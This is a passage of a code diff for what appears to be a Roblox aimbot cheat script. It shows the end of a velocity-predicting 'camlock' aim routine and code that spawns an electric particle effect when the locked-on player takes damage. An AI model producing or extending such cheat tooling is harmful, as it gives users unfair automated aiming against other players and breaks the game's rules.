+                jamklestarget.Character[jamkles.camlock.aim_part].Position +
+                Vector3.new(
+                    jamklestarget.Character[jamkles.camlock.aim_part].Velocity.X,
+                    (jamklestarget.Character[jamkles.camlock.aim_part].Velocity.Y * 0.5),
+                    jamklestarget.Character[jamkles.camlock.aim_part].Velocity.Z
+                ) *
+                    jamkles.camlock.prediction
+        else
+            AimPoint =
+                jamklestarget.Character[jamkles.camlock.aim_part].Position +
+                jamklestarget.Character[jamkles.camlock.aim_part].Velocity * jamkles.camlock.prediction
+        end
+    end
+end
+
+function ElectricHitEffect(Position)
+    local Part = Instance.new("Part")
+    Part.Position = Position
+    Part.CanCollide = false
+    Part.Anchored = true
+    Part.Transparency = 1
+    Part.Parent = workspace
+
+    local Attachment = Instance.new("Attachment")
+    Attachment.Parent = Part
+
+    local ParticleEmitter2 = Instance.new("ParticleEmitter")
+    ParticleEmitter2.Name = "ParticleEmitter2"
+    ParticleEmitter2.FlipbookFramerate = NumberRange.new(20, 20)
+    ParticleEmitter2.Lifetime = NumberRange.new(0.19, 0.38)
+    ParticleEmitter2.FlipbookLayout = Enum.ParticleFlipbookLayout.Grid4x4
+    ParticleEmitter2.SpreadAngle = Vector2.new(360, 360)
+    ParticleEmitter2.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.209842, 0.5), NumberSequenceKeypoint.new(0.503842, 0.263333), NumberSequenceKeypoint.new(0.799842, 0.5), NumberSequenceKeypoint.new(1, 1)})
+    ParticleEmitter2.LightEmission = 1
+    ParticleEmitter2.Color = ColorSequence.new(Color3.fromRGB(103, 192, 253))
+    ParticleEmitter2.VelocitySpread = 360
+    ParticleEmitter2.Speed = NumberRange.new(0.0161231, 0.0161231)
+    ParticleEmitter2.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 4.3125), NumberSequenceKeypoint.new(0.3985056, 7.9375), NumberSequenceKeypoint.new(1, 10)})
+    ParticleEmitter2.Enabled = false
+    ParticleEmitter2.ZOffset = 0.15
+    ParticleEmitter2.Rate = 100
+    ParticleEmitter2.Texture = "http://www.roblox.com/asset/?id=12394566430"
+    ParticleEmitter2.FlipbookMode = Enum.ParticleFlipbookMode.OneShot
+    ParticleEmitter2.Rotation = NumberRange.new(39, 999)
+    ParticleEmitter2.Orientation = Enum.ParticleOrientation.VelocityParallel
+    ParticleEmitter2.Parent = Attachment
+
+    ParticleEmitter2:Emit()
+end
+
+local function setupHitMarker(plr)
+    plr.CharacterAdded:Connect(function(char)
+        local humanoid = char:WaitForChild("Humanoid")
+        local oldHealth = humanoid.Health
+
+        local connection
+        connection = humanoid.HealthChanged:Connect(function(health)
+            if health < oldHealth then
+                if plr == jamklestarget then
+                    if jamkles.HitEffects.Enabled then
+                        ElectricHitEffect(plr.Character.HumanoidRootPart.CFrame.Position)
+                    end
+                end
+            end
+            oldHealth = health
+            if health == 0 then
+                connection:Disconnect()
+            end
+        end)
+    end)
+end
+
+-- First detection block
+for i, plr in pairs(game.Players:GetPlayers()) do
+    setupHitMarker(plr)
+end
+
+-- Second detection block
+for i, plr in pairs(game.Players:GetChildren()) do
+    local char = plr.Character
+    local humanoid = char and char:FindFirstChild("Humanoid")
+    if humanoid then
+        local oldHealth = humanoid.Health
+        local connection
+        
+        connection = humanoid.HealthChanged:Connect(function(health)
+            if health < oldHealth then
+                if plr == jamklestarget then
+                    if jamkles.HitEffects.Enabled then
+                        ElectricHitEffect(plr.Character.HumanoidRootPart.CFrame.Position)
+                    end
+                end
+            end
+            oldHealth = health
+            if health == 0 then
+                connection:Disconnect()
+            end
+        end)
+    end
+end
